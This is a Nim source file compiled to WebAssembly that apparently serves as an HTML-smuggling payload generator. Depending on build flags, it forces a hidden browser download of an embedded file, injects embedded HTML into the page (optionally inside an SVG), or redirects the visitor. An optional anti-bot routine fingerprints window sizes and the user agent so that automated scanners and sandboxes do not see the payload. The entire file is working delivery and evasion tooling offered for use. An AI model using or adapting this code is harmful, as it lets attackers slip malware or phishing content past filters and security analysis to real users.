import tables
import strutils
import wasmrt

type
    Window = object of JSObj
    Document = object of JSObj
    Node = object of JSObj
    Blob = object of JSObj
    Url_t = object of JSObj
    Str = object of JSObj


proc window(): Window {.importwasmp.}
proc document(): Document {.importwasmp.}
proc body(d: Document): Node {.importwasmp.}
proc innerHTML(d: Node, s: cstring) {.importwasmp.}
proc write(d: Document, content: cstring) {.importwasmm.}
proc createElement(d: Document, s: cstring): Node {.importwasmm.}
proc appendChild(n: Node, child: Node): Node {.importwasmm.}
proc querySelector(d: Document, selector: cstring): Node {.importwasmm.}
proc createElementNS(d: Document, namespace: cstring, qualifiedName: cstring): Node {.importwasmm.}
proc URL(w: Window): Url_t {.importwasmp.}
proc location(w: JSObj): JSObj {.importwasmp.}
proc href(w: JSObj, s: cstring) {.importwasmp.}
proc createObjectURL(url: Url_t, b: Blob): Str {.importwasmm.}
proc revokeObjectURL(burl: Url_t, url: Str) {.importwasmm.}
proc click(n: Node) {.importwasmm.}
proc newBlobAux(typ: cstring, data: pointer, sz: uint32): Blob {.importwasmexpr: """
    new Blob([new Uint8Array(_nima, $1, $2)], {type: _nimsj($0)})
    """.}
proc newBlob(typ: cstring, data: openarray[byte]): Blob {.inline.} =
  newBlobAux(typ, addr data, data.len.uint32)
proc setProp(n: JSObj, kIsStr: bool, k: pointer, vType: uint8, v: pointer) {.importwasmexpr: """
    _nimo[$0][$1?_nimsj($2):$2] = $3&1?_nimsj($4):$3&3?!!$4:$3&4?_nimo[$4]:$4
    """.}
proc setProperty(n: JSObj, k: cstring, v: JSObj) {.inline.} =
  setProp(n, true, cast[pointer](k), 4, v.o)
proc setAttribute*(n: Node, k, v: cstring) {.importwasmm.}

var doc = document()
var windw = window()



when defined(antibot):
  proc is_bot(): bool =
    # cheers https://github.com/yglukhov/wafli/blob/cccb90c475408cca252b4ca075752dbf3660fd07/wafli/js_utils.nim
    proc length(j: JSObj): int {.importwasmp.}
    proc strWriteOut(j: JSObj, p: pointer, len: int): int {.importwasmf: "_nimws".}

    proc jsStringToStr(v: JSObj): string =
      if not v.isNil:
        let sz = length(v) * 3
        result.setLen(sz)
        if sz != 0:
          let actualSz = strWriteOut(v, addr result[0], sz)
          result.setLen(actualSz)

    proc getObjProperty(n: JSObj, isStr: bool, k: pointer): JSObj {.importwasmexpr: """
    _nimo[$0][$1?_nimsj($2):$2]
    """.}

    proc getIntProperty(n: JSObj, isStr: bool, k: pointer): int32 {.importwasmexpr: """
    _nimo[$0][$1?_nimsj($2):$2]
    """.}

    proc getIntProperty(n: JSObj, idx: int32): int32 {.inline.} =
      getIntProperty(n, false, cast[pointer](idx))

    proc getIntProperty(n: JSObj, idx: cstring): int32 {.inline.} =
      getIntProperty(n, true, cast[pointer](idx))

    proc getObjProperty(n: JSObj, idx: int32): JSObj {.inline.} =
      getObjProperty(n, false, cast[pointer](idx))

    proc getObjProperty(n: JSObj, idx: cstring): JSObj {.inline.} =
      getObjProperty(n, true, cast[pointer](idx))

    proc getStrProperty(n: JSObj, idx: int32): string {.inline.} =
      jsStringToStr(getObjProperty(n, idx))

    proc getStrProperty(n: JSObj, idx: cstring): string {.inline.} =
      jsStringToStr(getObjProperty(n, idx))


    proc navigator(w: JSObj): JSObj {.importwasmp.}
    let platform = getStrProperty(windw.navigator, "platform")
    let platforms = {
      "Win32": "Windows",
    }.toTable

    let user_agent = getStrProperty(windw.navigator, "userAgent").toLowerAscii()
    let platform_os = platforms.getOrDefault(platform, platform)
    if not user_agent.contains(platform_os.toLowerAscii()):
      return true

    let outerW = getIntProperty(windw, "outerWidth")
    let outerH = getIntProperty(windw, "outerHeight")
    let innerW = getIntProperty(windw, "innerWidth")
    let innerH = getIntProperty(windw, "innerHeight")

    if (outerH == innerH) or (outerW == innerW): # Kuba Gretzky's talk
      return true

    let aspect_ratio = innerW / innerH
    if aspect_ratio < 0.5 or aspect_ratio > 10 or aspect_ratio == 1:
      return true

    if innerW < 200 or innerH < 150: 
      return true

    let devicePixelRatio = getIntProperty(windw, "devicePixelRatio")
    if devicePixelRatio > 4: 
      return true

    return false


when defined(smuggle):
  proc embed_file_bytes(filepath: string): seq[byte] {.compiletime.}  = 
    var file = readFile(filepath)
    var bytes: seq[byte] = newSeq[byte](file.len)
    for i, c in file:
        bytes[i] = byte(c)
    return bytes

  const fileName {.strdefine.}: string = "download.txt"
  const filePath {.strdefine.}: string = "smuggleme.txt"
  const fileBytes = embed_file_bytes(filePath)

  proc main(): int =
    when defined(antibot):
      if is_bot(): return 1
    var node = doc.createElement("a".cstring)
    discard doc.body.appendChild(node)
    node.setAttribute("style".cstring, "display: none")
    var blob = newBlob("octet/stream", fileBytes)
    var createdUrl = windw.URL.createObjectURL(blob)
    node.setProperty("href".cstring, createdUrl)
    node.setAttribute("download".cstring, fileName.cstring)
    node.click()
    windw.URL.revokeObjectURL(createdUrl)
    return 0
  discard main()


when defined(html):
  const filePath {.strdefine.}: string = "smuggleme.txt"
  const fileContent = staticRead(filePath)
  const svgdocument {.booldefine.}: bool = false

  proc main(): int =
    when defined(antibot):
      if is_bot(): return 1
    if svgdocument:
      var svg = doc.querySelector("svg".cstring)
      svg.innerHTML("".cstring)

      var foreignObject = doc.createElementNS("http://www.w3.org/2000/svg".cstring, "foreignObject".cstring)
      foreignObject.setAttribute("height".cstring, "100%".cstring)
      foreignObject.setAttribute("width".cstring, "100%".cstring)

      var container = doc.createElement("div".cstring)
      container.setAttribute("xmlns".cstring, "http://www.w3.org/1999/xhtml".cstring)
      container.innerHTML(fileContent.cstring)
      discard foreignObject.appendChild(container)
      discard svg.appendChild(foreignObject)
    else: 
      doc.body.innerHTML(fileContent.cstring)
    return 0
  discard main()


when defined(redirect):
  const url {.strdefine.}: string = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

  proc main(): int =
    when defined(antibot):
      if is_bot(): return 1
    windw.location.href(url.cstring)
  discard main()

when not defined(smuggle) and not defined(html) and not defined(redirect):
  proc default() =
    echo "Hi! You didn't select any payload type"
  default()

